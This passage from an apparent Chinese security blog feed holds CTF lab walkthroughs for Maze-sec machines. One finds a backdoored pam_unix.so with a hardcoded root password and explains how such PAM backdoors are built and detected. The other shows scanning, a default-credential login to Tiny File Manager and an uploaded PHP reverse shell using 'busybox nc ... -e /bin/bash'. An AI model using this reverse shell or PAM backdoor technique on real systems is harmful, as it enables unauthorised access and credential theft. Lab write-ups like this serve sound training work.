class="hljs-string"># %!&quot;</span><br><span class="hljs-string"># %!</span><br><span class="hljs-string"># %!x</span><br><span class="hljs-string"># %!</span><br><span class="hljs-string"># %!&quot;</span><br><span class="hljs-string">crtstuff.c</span><br><span class="hljs-string">deregister_tm_clones</span><br><span class="hljs-string">__do_global_dtors_aux</span><br><span class="hljs-string">completed.0</span><br><span class="hljs-string">__do_global_dtors_aux_fini_array_entry</span><br><span class="hljs-string">frame_dummy</span><br><span class="hljs-string">__frame_dummy_init_array_entry</span><br><span class="hljs-string">bigcrypt.c</span><br><span class="hljs-string">pam_unix_acct.c</span><br><span class="hljs-string">envp.0</span><br><span class="hljs-string">pam_unix_auth.c</span><br><span class="hljs-string">setcred_free</span><br><span class="hljs-string">pam_unix_passwd.c</span><br><span class="hljs-string">_unix_verify_shadow</span><br><span class="hljs-string">_pam_unix_approve_pass</span><br><span class="hljs-string">pam_unix_sess.c</span><br><span class="hljs-string">support.c</span><br><span class="hljs-string">_unix_cleanup</span><br><span class="hljs-string">_unix_run_helper_binary</span><br><span class="hljs-string">_cleanup_failures</span><br><span class="hljs-string">search_key.constprop.0</span><br><span class="hljs-string">unix_args</span><br><span class="hljs-string">passverify.c</span><br><span class="hljs-string">crypt_make_salt</span><br><span class="hljs-string">valid.2</span><br><span class="hljs-string">buf.1</span><br><span class="hljs-string">nbuf.0</span><br><span class="hljs-string">yppasswd_xdr.c</span><br><span class="hljs-string">md5_good.c</span><br><span class="hljs-string">itoa64</span><br><span class="hljs-string">md5_broken.c</span><br><span class="hljs-string">__FRAME_END__</span><br><span class="hljs-string">xdr_yppasswd</span><br><span class="hljs-string">_unix_run_verify_binary</span><br><span class="hljs-string">_set_ctrl</span><br><span class="hljs-string">BrokenMD5Transform</span><br><span class="hljs-string">get_account_info</span><br><span class="hljs-string">Goodcrypt_md5</span><br><span class="hljs-string">BrokenMD5Init</span><br><span class="hljs-string">bigcrypt</span><br><span class="hljs-string">_fini</span><br><span class="hljs-string">save_old_password</span><br><span class="hljs-string">crypt_md5_wrapper</span><br><span class="hljs-string">unix_update_passwd</span><br><span class="hljs-string">unix_update_shadow</span><br><span class="hljs-string">create_password_hash</span><br><span class="hljs-string">Brokencrypt_md5</span><br><span class="hljs-string">__dso_handle</span><br><span class="hljs-string">_unix_getpwnam</span><br><span class="hljs-string">GoodMD5Final</span><br><span class="hljs-string">_unix_comesfromsource</span><br><span class="hljs-string">GoodMD5Transform</span><br><span class="hljs-string">_make_remark</span><br><span class="hljs-string">_DYNAMIC</span><br><span class="hljs-string">is_pwd_shadowed</span><br><span class="hljs-string">unlock_pwdf</span><br><span class="hljs-string">BrokenMD5Final</span><br><span class="hljs-string">unix_selinux_confined</span><br><span class="hljs-string">GoodMD5Init</span><br><span class="hljs-string">get_pwd_hash</span><br><span class="hljs-string">check_shadow_expiry</span><br><span class="hljs-string">__GNU_EH_FRAME_HDR</span><br><span class="hljs-string">__TMC_END__</span><br><span class="hljs-string">_GLOBAL_OFFSET_TABLE_</span><br><span class="hljs-string">GoodMD5Update</span><br><span class="hljs-string">_unix_blankpasswd</span><br><span class="hljs-string">_unix_verify_password</span><br><span class="hljs-string">verify_pwd_hash</span><br><span class="hljs-string">_init</span><br><span class="hljs-string">BrokenMD5Update</span><br><span class="hljs-string">xdr_xpasswd</span><br><span class="hljs-string">pam_modutil_sanitize_helper_fds@LIBPAM_MODUTIL_1.1.9</span><br><span class="hljs-string">free@GLIBC_2.2.5</span><br><span class="hljs-string">pam_modutil_getpwnam@LIBPAM_MODUTIL_1.0</span><br><span class="hljs-string">strcasecmp@GLIBC_2.2.5</span><br><span class="hljs-string">__errno_location@GLIBC_2.2.5</span><br><span class="hljs-string">unlink@GLIBC_2.2.5</span><br><span class="hljs-string">strncpy@GLIBC_2.2.5</span><br><span class="hljs-string">strncmp@GLIBC_2.2.5</span><br><span class="hljs-string">_ITM_deregisterTMCloneTable</span><br><span class="hljs-string">stdout@GLIBC_2.2.5</span><br><span class="hljs-string">_exit@GLIBC_2.2.5</span><br><span class="hljs-string">strcpy@GLIBC_2.2.5</span><br><span class="hljs-string">pam_set_item@LIBPAM_1.0</span><br><span class="hljs-string">pam_get_data@LIBPAM_1.0</span><br><span class="hljs-string">putspent@GLIBC_2.2.5</span><br><span class="hljs-string">sigaction@GLIBC_2.2.5</span><br><span class="hljs-string">pam_sm_setcred</span><br><span class="hljs-string">pam_prompt@LIBPAM_EXTENSION_1.0</span><br><span class="hljs-string">write@GLIBC_2.2.5</span><br><span class="hljs-string">getpid@GLIBC_2.2.5</span><br><span class="hljs-string">clock@GLIBC_2.2.5</span><br><span class="hljs-string">yp_unbind@LIBNSL_1.0</span><br><span class="hljs-string">fclose@GLIBC_2.2.5</span><br><span class="hljs-string">stpcpy@GLIBC_2.2.5</span><br><span class="hljs-string">yp_master@LIBNSL_1.0</span><br><span class="hljs-string">dcgettext@GLIBC_2.2.5</span><br><span class="hljs-string">strlen@GLIBC_2.2.5</span><br><span class="hljs-string">getuid@GLIBC_2.2.5</span><br><span class="hljs-string">dup2@GLIBC_2.2.5</span><br><span class="hljs-string">strchr@GLIBC_2.2.5</span><br><span class="hljs-string">snprintf@GLIBC_2.2.5</span><br><span class="hljs-string">gettimeofday@GLIBC_2.2.5</span><br><span class="hljs-string">fputs@GLIBC_2.2.5</span><br><span class="hljs-string">memset@GLIBC_2.2.5</span><br><span class="hljs-string">geteuid@GLIBC_2.2.5</span><br><span class="hljs-string">pam_modutil_getlogin@LIBPAM_MODUTIL_1.0</span><br><span class="hljs-string">strncat@GLIBC_2.2.5</span><br><span class="hljs-string">authunix_create_default@GLIBC_2.2.5</span><br><span class="hljs-string">pipe@GLIBC_2.2.5</span><br><span class="hljs-string">yp_match@LIBNSL_1.0</span><br><span class="hljs-string">strtok_r@GLIBC_2.2.5</span><br><span class="hljs-string">pam_sm_chauthtok</span><br><span class="hljs-string">read@GLIBC_2.2.5</span><br><span class="hljs-string">fgets@GLIBC_2.2.5</span><br><span class="hljs-string">execve@GLIBC_2.2.5</span><br><span class="hljs-string">xdr_string@GLIBC_2.2.5</span><br><span class="hljs-string">calloc@GLIBC_2.2.5</span><br><span class="hljs-string">pam_sm_close_session</span><br><span class="hljs-string">__getdelim@GLIBC_2.2.5</span><br><span class="hljs-string">strcmp@GLIBC_2.2.5</span><br><span class="hljs-string">getpwnam@GLIBC_2.2.5</span><br><span class="hljs-string">feof@GLIBC_2.2.5</span><br><span class="hljs-string">__gmon_start__</span><br><span class="hljs-string">umask@GLIBC_2.2.5</span><br><span class="hljs-string">strtol@GLIBC_2.2.5</span><br><span class="hljs-string">memcpy@GLIBC_2.14</span><br><span class="hljs-string">time@GLIBC_2.2.5</span><br><span class="hljs-string">fileno@GLIBC_2.2.5</span><br><span class="hljs-string">malloc@GLIBC_2.2.5</span><br><span class="hljs-string">strncasecmp@GLIBC_2.2.5</span><br><span class="hljs-string">fflush@GLIBC_2.2.5</span><br><span class="hljs-string">pam_sm_acct_mgmt</span><br><span class="hljs-string">strsep@GLIBC_2.2.5</span><br><span class="hljs-string">__isoc99_sscanf@GLIBC_2.7</span><br><span class="hljs-string">fgetpwent@GLIBC_2.2.5</span><br><span class="hljs-string">syslog@GLIBC_2.2.5</span><br><span class="hljs-string">__fxstat@GLIBC_2.2.5</span><br><span class="hljs-string">yp_bind@LIBNSL_1.0</span><br><span class="hljs-string">xdr_int@GLIBC_2.2.5</span><br><span class="hljs-string">fgetspent@GLIBC_2.2.5</span><br><span class="hljs-string">crypt_r@XCRYPT_2.0</span><br><span class="hljs-string">yperr_string@LIBNSL_1.0</span><br><span class="hljs-string">clnt_sperrno@GLIBC_2.2.5</span><br><span class="hljs-string">fchmod@GLIBC_2.2.5</span><br><span class="hljs-string">pam_syslog@LIBPAM_EXTENSION_1.0</span><br><span class="hljs-string">fsync@GLIBC_2.2.5</span><br><span class="hljs-string">pam_sm_open_session</span><br><span class="hljs-string">waitpid@GLIBC_2.2.5</span><br><span class="hljs-string">clnt_create@GLIBC_2.2.5</span><br><span class="hljs-string">fchown@GLIBC_2.2.5</span><br><span class="hljs-string">fopen@GLIBC_2.2.5</span><br><span class="hljs-string">ulckpwdf@GLIBC_2.2.5</span><br><span class="hljs-string">pam_get_item@LIBPAM_1.0</span><br><span class="hljs-string">dcngettext@GLIBC_2.2.5</span><br><span class="hljs-string">rename@GLIBC_2.2.5</span><br><span class="hljs-string">pam_set_data@LIBPAM_1.0</span><br><span class="hljs-string">pam_modutil_read@LIBPAM_MODUTIL_1.0</span><br><span class="hljs-string">pam_get_user@LIBPAM_1.0</span><br><span class="hljs-string">pam_modutil_getspnam@LIBPAM_MODUTIL_1.0</span><br><span class="hljs-string">pam_sm_authenticate</span><br><span class="hljs-string">yp_get_default_domain@LIBNSL_1.0</span><br><span class="hljs-string">pam_fail_delay@LIBPAM_1.0</span><br><span class="hljs-string">_ITM_registerTMCloneTable</span><br><span class="hljs-string">setuid@GLIBC_2.2.5</span><br><span class="hljs-string">strdup@GLIBC_2.2.5</span><br><span class="hljs-string">putpwent@GLIBC_2.2.5</span><br><span class="hljs-string">pam_get_authtok@LIBPAM_EXTENSION_1.1</span><br><span class="hljs-string">__cxa_finalize@GLIBC_2.2.5</span><br><span class="hljs-string">fork@GLIBC_2.2.5</span><br><span class="hljs-string">getrpcport@GLIBC_2.2.5</span><br><span class="hljs-string">__ctype_b_loc@GLIBC_2.3</span><br><span class="hljs-string">usleep@GLIBC_2.2.5</span><br><span class="hljs-string">.symtab</span><br><span class="hljs-string">.strtab</span><br><span class="hljs-string">.shstrtab</span><br><span class="hljs-string">.note.gnu.build-id</span><br><span class="hljs-string">.gnu.hash</span><br><span class="hljs-string">.dynsym</span><br><span class="hljs-string">.dynstr</span><br><span class="hljs-string">.gnu.version</span><br><span class="hljs-string">.gnu.version_r</span><br><span class="hljs-string">.rela.dyn</span><br><span class="hljs-string">.rela.plt</span><br><span class="hljs-string">.init</span><br><span class="hljs-string">.plt.got</span><br><span class="hljs-string">.text</span><br><span class="hljs-string">.fini</span><br><span class="hljs-string">.rodata</span><br><span class="hljs-string">.eh_frame_hdr</span><br><span class="hljs-string">.eh_frame</span><br><span class="hljs-string">.init_array</span><br><span class="hljs-string">.fini_array</span><br><span class="hljs-string">.data.rel.ro</span><br><span class="hljs-string">.dynamic</span><br><span class="hljs-string">.got.plt</span><br><span class="hljs-string">.data</span><br><span class="hljs-string">.bss</span><br><span class="hljs-string">.comment</span><br><span class="hljs-string">.debug_aranges</span><br><span class="hljs-string">.debug_info</span><br><span class="hljs-string">.debug_abbrev</span><br><span class="hljs-string">.debug_line</span><br><span class="hljs-string">.debug_str</span><br><span class="hljs-string">.debug_loc</span><br><span class="hljs-string">.debug_ranges</span><br><span class="hljs-string">morri@Backdoor1:~$ </span><br></code></pre></td></tr></table></figure><p>找到特别的地方，root密码为<code>660930334</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">pam_unix_auth: cannot allocate ret_data<br>auth could not identify password <span class="hljs-keyword">for</span> [%s]<br>PAM: Root access granted via backdoor<br>bad username [%s]<br>660930334<br>No password supplied<br>Password unchanged<br></code></pre></td></tr></table></figure><h2 id="3、获取ROOT权限"><a href="#3、获取ROOT权限" class="headerlink" title="3、获取ROOT权限"></a>3、获取ROOT权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">morri@Backdoor1:~$ su root<br>Password: <br>root@Backdoor1:/home/morri# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Backdoor1:~# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-5d363bb914c59fd1cd2b59e998bedb4f&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、FUFF测试"><a href="#1、FUFF测试" class="headerlink" title="1、FUFF测试"></a>1、FUFF测试</h2><p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p><h2 id="2、查看修改过的文件"><a href="#2、查看修改过的文件" class="headerlink" title="2、查看修改过的文件"></a>2、查看修改过的文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -<span class="hljs-built_in">type</span> f -newermt <span class="hljs-string">&quot;2025-07-05&quot;</span> ! -newermt <span class="hljs-string">&quot;2025-07-10&quot;</span> ! -path <span class="hljs-string">&#x27;/proc/*&#x27;</span> ! -path <span class="hljs-string">&#x27;/sys/*&#x27;</span> ! -path <span class="hljs-string">&#x27;/run/*&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h2 id="3、pam-unix-so包"><a href="#3、pam-unix-so包" class="headerlink" title="3、pam_unix.so包"></a>3、pam_unix.so包</h2><p>Linux中的<code>pam_unix.so</code>是PAM（可插拔认证模块）的核心模块之一，主要用于传统Unix系统的身份认证。以下是其功能、配置、安全风险及后门技术的综合分析：<br>Linux中的<code>pam_unix.so</code>是PAM（可插拔认证模块）的核心模块之一，主要用于传统Unix系统的身份认证。以下是其功能、配置、安全风险及后门技术的综合分析：<br> <strong>一、核心功能与作用</strong></p><ol><li><strong>密码认证</strong><ul><li>通过比对用户输入的密码与<code>/etc/shadow</code>中的加密密码实现身份验证。</li><li>支持多种加密算法（如MD5、SHA256、SHA512），可通过参数<code>md5</code>、<code>sha256</code>等指定。</li></ul></li><li><strong>账户管理</strong><ul><li>检查用户账户有效性（如是否过期、是否允许登录）。</li><li>控制用户登录权限（如禁止root通过SSH登录）。</li></ul></li><li><strong>会话与进程权限</strong><ul><li>设置用户会话的默认权限（如<code>umask</code>值）。</li><li>限制普通用户执行敏感操作。</li></ul></li></ol><p> <strong>二、配置与参数</strong></p><ol><li><strong>配置文件位置</strong><ul><li>通常位于<code>/etc/pam.d/</code>目录下（如<code>system-auth</code>、<code>sshd</code>等文件）。</li></ul></li><li><strong>关键参数</strong><ul><li><strong>控制标记</strong>：<ul><li><code>required</code>：必须通过认证，但失败不影响后续模块执行。</li><li><code>requisite</code>：失败立即终止流程。</li><li><code>sufficient</code>：成功则跳过后续模块。</li><li><code>optional</code>：认证可跳过。</li></ul></li><li><strong>功能参数</strong>：<ul><li><code>shadow</code>：从<code>/etc/shadow</code>读取密码。</li><li><code>nullok</code>：允许空密码（生产环境建议禁用）。</li><li><code>audit</code>：记录认证日志到syslog</li></ul></li></ul></li></ol><p><strong>三、安全风险与后门技术</strong></p><ol><li><strong>已知风险</strong><ul><li><strong>弱密码策略</strong>：默认仅依赖密码复杂度，易受暴力破解攻击。</li><li><strong>配置文件篡改</strong>：若<code>/etc/pam.d/</code>下的配置被修改，可能导致未授权访问。</li></ul></li><li><strong>后门实现方法</strong><ul><li><strong>源码修改</strong>：<ul><li>在<code>_unix_verify_password</code>函数中插入万能密码（如<code>strcmp(p, &quot;0xMitsurugi&quot;)</code>），绕过正常认证。</li><li>编译后替换系统原文件（<code>/lib64/security/pam_unix.so</code>），需关闭SELinux或调整文件上下文。</li></ul></li><li><strong>日志记录</strong>：<ul><li>修改代码记录用户密码到指定文件（如<code>/tmp/pslog</code>），用于后续窃取。</li></ul></li></ul></li><li><strong>检测方法</strong><ul><li><strong>文件校验</strong>：检查<code>pam_unix.so</code>的修改时间、MD5校验和，对比官方版本。</li><li><strong>行为监控</strong>：通过<code>strace</code>跟踪模块调用，观察异常密码校验逻辑。</li><li><strong>日志审计</strong>：检查<code>/var/log/secure</code>中是否存在非常规认证记录。</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>FUFF</tag>
      
      <tag>提权-dpkg-v</tag>
      
      <tag>提权-pam_unix.so</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sudo</title>
    <link href="/Maze-sec/Sudo/"/>
    <url>/Maze-sec/Sudo/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sudo]<br>└─# nmap -sn 192.168.2.0/24               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-11 14:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00060s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00097s latency).<br>MAC Address: 08:00:27:3F:6C:00 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.53<br>Host is up (0.0047s latency).<br>MAC Address: 08:00:27:EF:1D:95 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.11 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.53</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sudo]<br>└─# nmap --min-rate 10000 -p- 192.168.2.53<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-11 14:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.53<br>Host is up (0.00012s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:EF:1D:95 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.55 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sudo]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.53<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-11 14:14 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.53<br>Host is up (0.00080s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Redirecting to File Manager<br>|_http-server-header: Apache/2.4.62 (Debian)<br>MAC Address: 08:00:27:EF:1D:95 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.91 seconds<br></code></pre></td></tr></table></figure><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sudo]<br>└─# nmap -sU --top-ports 100 192.168.2.53                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-11 14:14 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.53<br>Host is up (0.00078s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:EF:1D:95 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 106.97 seconds<br></code></pre></td></tr></table></figure><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，自动重定向到<code>tinyfilemanager.php</code>，是<code>Tiny File Manager</code>系统<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507111431318.png"></p><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sudo]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.53/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.53/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 883]<br>/LICENSE              (Status: 200) [Size: 35147]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>没找到有用的信息</p><h2 id="2、Tiny-File-Manager默认密码"><a href="#2、Tiny-File-Manager默认密码" class="headerlink" title="2、Tiny File Manager默认密码"></a>2、Tiny File Manager默认密码</h2><p>查看Tiny File Manager的文档，发现默认的密码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507111454009.png"></p><p>尝试进行登录，成功进入<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507111454594.png"></p><h1 id="四、获取www-data权限"><a href="#四、获取www-data权限" class="headerlink" title="四、获取www-data权限"></a>四、获取www-data权限</h1><h2 id="1、上传shell"><a href="#1、上传shell" class="headerlink" title="1、上传shell"></a>1、上传shell</h2><p>发现可以上传文件，直接上传一个反弹shell的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sudo]<br>└─# <span class="hljs-built_in">cat</span> rev.php <br>&lt;?php<br>  <span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;busybox nc 192.168.2.4 4444 -e /bin/bash&quot;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="2、获得www-data权限"><a href="#2、获得www-data权限" class="headerlink" title="2、获得www-data权限"></a>2、获得www-data权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sudo]<br>└─# nc -lvnp 4444                        <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.53] 35536<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/usr/bin/script -qc /bin/bash /dev/null<br>www-data@Sudo:/var/www/html$ ^Z<br>zsh: suspended  nc -lvnp 4444<br>                                                                                                                                               <br>┌──(root㉿kali)-[/miao/maze-sec/sudo]<br>└─# <span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>;<span class="hljs-built_in">fg</span><br>[1]  + continued  nc -lvnp 4444<br>                               reset<br>reset: unknown terminal <span class="hljs-built_in">type</span> unknown<br>Terminal <span class="hljs-built_in">type</span>? <br>Terminal <span class="hljs-built_in">type</span>? ^C<br>www-data@Sudo:/var/www/html$ <span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sudo:/home/eecho$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-e1930b4927e6b6d92d120c7c1bba3421&#125;<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><p>使用<code>sudo -l</code>发现需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sudo:/var/www/html$ <span class="hljs-built_in">sudo</span> -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great 